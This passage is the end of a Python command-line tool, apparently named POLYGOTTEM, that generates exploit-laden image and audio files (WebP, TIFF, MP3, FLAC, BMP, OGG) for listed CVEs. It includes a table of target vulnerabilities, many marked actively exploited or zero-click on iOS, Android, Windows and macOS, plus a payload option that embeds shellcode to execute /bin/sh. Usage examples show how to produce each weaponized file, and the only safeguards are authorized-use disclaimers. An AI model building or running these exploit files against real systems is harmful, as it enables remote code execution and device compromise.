            'CVE-2021-0561': ('FLAC <1.3.4 - Encoder OOB write', 'medium'),
            'CVE-2017-11126': ('mpg123 - Global buffer overflow in Layer III', 'medium'),
            'CVE-2021-40426': ('libsox - SPHERE file heap overflow', 'medium'),

            # 2025 macOS OVERFLOWS
            'CVE-2025-43300': ('Apple ImageIO (iOS/iPadOS/macOS) - DNG/TIFF JPEG Lossless OOB write (CRITICAL - ACTIVELY EXPLOITED ZERO-DAY, zero-click RCE via iMessage)', 'critical'),
            'CVE-2025-24228': ('macOS Kernel (Ventura/Sonoma/Sequoia) - Buffer overflow with kernel privileges (CVSS 7.8)', 'high'),
            'CVE-2025-24153': ('macOS SMB - Buffer overflow enabling kernel code execution', 'high'),
            'CVE-2025-24156': ('macOS Xsan - Integer overflow privilege escalation', 'high'),
            'CVE-2025-24154': ('macOS WebContentFilter - Out-of-bounds write kernel memory corruption', 'high'),

            # 2025 WINDOWS OVERFLOWS
            'CVE-2025-60724': ('Windows GDI+ (all versions) - Heap overflow RCE via crafted metafile/image (CVSS 9.8)', 'critical'),
            'CVE-2025-62215': ('Windows Kernel - Race condition double-free for SYSTEM privileges (CVSS 7.8, ACTIVELY EXPLOITED)', 'high'),
            'CVE-2025-47981': ('Windows SPNEGO - Heap overflow zero-click RCE via SMB/RDP/HTTP (CVSS 9.8)', 'critical'),

            # 2025 LINUX OVERFLOWS
            'CVE-2025-0927': ('Linux kernel HFS+ (2.6.12-6.12.0) - Heap overflow for root/kernel privileges (CVSS 7.8)', 'high'),
            'CVE-2025-37810': ('Linux kernel - Out-of-bounds write for privilege escalation (CVSS 7.5)', 'high'),

            # 2025 iOS/iPhone OVERFLOWS
            'CVE-2025-24085': ('iOS Core Media (before 18.3) - Use-after-free privilege escalation (CVSS 7.8, ACTIVELY EXPLOITED before iOS 17.2)', 'high'),
            'CVE-2025-31200': ('iOS CoreAudio (before 18.4.1) - Zero-click heap corruption RCE via audio file/iMessage (CVSS 9.8, ACTIVELY EXPLOITED)', 'critical'),
            'CVE-2025-31201': ('iOS PAC/RPAC (before 18.4.1) - Pointer Authentication bypass enabling kernel exploitation (CVSS 6.7, pairs with CVE-2025-31200)', 'high'),
            'CVE-2025-24201': ('iOS WebKit (before 18.3.2) - Out-of-bounds write sandbox escape (CVSS 8.8, ACTIVELY EXPLOITED in sophisticated attacks)', 'high'),
            'CVE-2025-24200': ('iOS Authorization (before 18.3.2) - USB Restricted Mode bypass (CVSS 5.5, requires physical access)', 'medium'),

            # Android 2025 CVEs
            'CVE-2025-48593': ('Android System (13-16) - Zero-click RCE buffer overflow (CVSS 9.8, CRITICAL, network-based)', 'critical'),
            'CVE-2025-21042': ('Samsung Android (Galaxy S22/S23/S24) - DNG image OOB write, LANDFALL spyware (CVSS 8.8, ACTIVELY EXPLOITED)', 'high'),
            'CVE-2025-21043': ('Samsung Android - Out-of-bounds write arbitrary code execution (CVSS 8.8)', 'high'),
            'CVE-2025-38352': ('Android Kernel (13-16) - POSIX CPU timers race condition PE (CVSS 7.4, ACTIVELY EXPLOITED by Google TAG)', 'high'),
            'CVE-2025-48543': ('Android Runtime (13-16) - Use-after-free sandbox escape (CVSS 7.8, ACTIVELY EXPLOITED)', 'high'),
            'CVE-2025-21479': ('Qualcomm Adreno GPU - Memory corruption via unauthorized commands (CVSS 8.6, ACTIVELY EXPLOITED)', 'high'),
            'CVE-2025-27038': ('Qualcomm Adreno GPU - Use-after-free in Chrome rendering (CVSS 7.5, ACTIVELY EXPLOITED by forensics)', 'high'),
            'CVE-2025-27363': ('Android Component - Remote code execution (CVSS 8.1, ACTIVELY EXPLOITED)', 'high'),
            'CVE-2025-20708': ('MediaTek Modem - OOB write via rogue base station (CVSS 8.0+, remote PE)', 'high'),
            'CVE-2025-20672': ('MediaTek Bluetooth - Heap overflow in BT drivers (CVSS 7.8, local PE)', 'high'),
        }

        target_info = targets.get(cve_id, ('Unknown target', 'unknown'))
        target_desc, severity = target_info

        print()
        if tui:
            # Show severity-based warning
            if severity == 'critical':
                tui.critical(f"TARGET: {target_desc}")
            elif severity == 'high':
                tui.warning(f"Target: {target_desc}")
            else:
                tui.info(f"Target: {target_desc}")
        else:
            print(f"[*] This exploit targets:")
            print(f"    {target_desc}")

        return output_path


def main():
    parser = argparse.ArgumentParser(
        description='Generate exploit image headers for CVE testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Supported CVEs (20 total):

EXISTING (5 CVEs):
  CVE-2015-8540    libpng buffer overflow
  CVE-2019-7317    libpng use-after-free
  CVE-2018-14498   libjpeg heap over-read
  CVE-2019-15133   giflib division by zero
  CVE-2016-3977    giflib heap overflow

PRIORITY 1 (Critical/Recent - 3 CVEs):
  CVE-2023-4863    libwebp heap overflow (CRITICAL - ACTIVELY EXPLOITED!)
  CVE-2024-10573   mpg123 Frankenstein stream heap overflow
  CVE-2023-52356   libtiff heap overflow

PRIORITY 2 (High-Value - 6 CVEs):
  CVE-2017-8373    libmad MP3 heap overflow
  CVE-2006-0006    Windows Media Player BMP heap overflow
  CVE-2020-22219   FLAC encoder buffer overflow
  CVE-2020-0499    FLAC decoder heap OOB read
  CVE-2008-1083    Windows GDI EMF/WMF heap overflow
  CVE-2005-4560    WMF SETABORTPROC code execution

PRIORITY 3 (Audio/Video - 6 CVEs):
  CVE-2017-6827    audiofile WAV MSADPCM heap overflow
  CVE-2018-5146    libvorbis OGG Vorbis OOB write
  CVE-2022-22675   AppleAVD iOS/macOS video accelerator overflow
  CVE-2021-0561    FLAC encoder OOB write
  CVE-2017-11126   mpg123 Layer III global buffer overflow
  CVE-2021-40426   libsox SPHERE file heap overflow

Payload Types:
  poc_marker       Safe PoC marker (default)
  nop_sled         NOP sled for testing
  exec_sh          Execute /bin/sh (x64 Linux)

Examples:
  # Generate CRITICAL WebP exploit (actively exploited in wild!)
  %(prog)s CVE-2023-4863 exploit.webp

  # Generate recent MP3 exploit
  %(prog)s CVE-2024-10573 exploit.mp3 -p nop_sled

  # Generate TIFF exploit with shellcode (DANGEROUS!)
  %(prog)s CVE-2023-52356 exploit.tiff -p exec_sh

  # Generate legacy Windows BMP exploit
  %(prog)s CVE-2006-0006 exploit.bmp

  # Generate FLAC audio exploit
  %(prog)s CVE-2020-22219 exploit.flac

  # Generate OGG Vorbis exploit
  %(prog)s CVE-2018-5146 exploit.ogg

WARNING: Only test on systems you own or have authorization to test!
These exploits can crash applications or execute arbitrary code!
Educational and research purposes ONLY!
        """
    )

    parser.add_argument('cve', nargs='?', help='CVE identifier (e.g., CVE-2015-8540)')
    parser.add_argument('output', nargs='?', help='Output file path')
    parser.add_argument('-p', '--payload', default='poc_marker',
                       choices=['poc_marker', 'nop_sled', 'exec_sh'],
                       help='Shellcode payload type')
    parser.add_argument('--no-color', action='store_true',
                       help='Disable colored output')
    parser.add_argument('--no-accel', action='store_true',
                       help='Disable Intel NPU/GPU hardware acceleration')
    parser.add_argument('--benchmark', action='store_true',
                       help='Run hardware acceleration benchmark')

    args = parser.parse_args()

    # Handle benchmark mode
    if args.benchmark:
        if ACCEL_AVAILABLE:
            accel = get_accelerator(verbose=True)
            print()
            accel.print_benchmark_results(size_mb=10.0)
            print()
        else:
            if TUI:
                t = TUI()
                t.error("Hardware acceleration not available (missing dependencies)")
            else:
                print("[!] Hardware acceleration not available")
        return 0

    # Validate required arguments
    if not args.cve or not args.output:
        parser.print_help()
        return 1

    # Initialize TUI
    tui = None
    if TUI is not None and not args.no_color:
        tui = TUI()
        tui.banner("POLYGOTTEM CVE Exploit Generator", "20 CVEs Supported | Intel Acceleration Ready")
    else:
        print("\n=== POLYGOTTEM CVE Exploit Generator ===\n")

    # Initialize generator with acceleration
    generator = ExploitHeaderGenerator(use_acceleration=not args.no_accel)

    # Show acceleration status
    if generator.accelerator and not args.no_color:
        stats = generator.accelerator.get_acceleration_stats()
        if stats['acceleration_enabled'] and tui:
            print()
            if stats['npu_available']:
                tui.success(f"Intel NPU acceleration: ENABLED ({stats['device_name']})")
            if stats['gpu_available']:
                tui.success(f"Intel Arc GPU acceleration: ENABLED ({stats['device_name']})")
            print()

    try:
        generator.generate_exploit(args.cve, args.output, args.payload, tui=tui)

        # Final warnings
        print()
        if tui:
            tui.box(" SECURITY WARNING", [
                "This file contains a CVE exploit payload!",
                "",
                "Only use for authorized security testing!",
                "Can crash applications or execute code!",
                "Educational and research purposes ONLY!"
            ])
        else:
            print("[!] WARNING: This file contains exploit payload!")
            print("    Only use for authorized security testing!")

        print()
        return 0
    except ValueError as e:
        if tui:
            tui.error(str(e))
        else:
            print(f"[!] Error: {e}", file=sys.stderr)
        return 1
    except Exception as e:
        if tui:
            tui.error(f"Failed to generate exploit: {e}")
        else:
            print(f"[!] Error: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        return 1


if __name__ == '__main__':
    sys.exit(main())
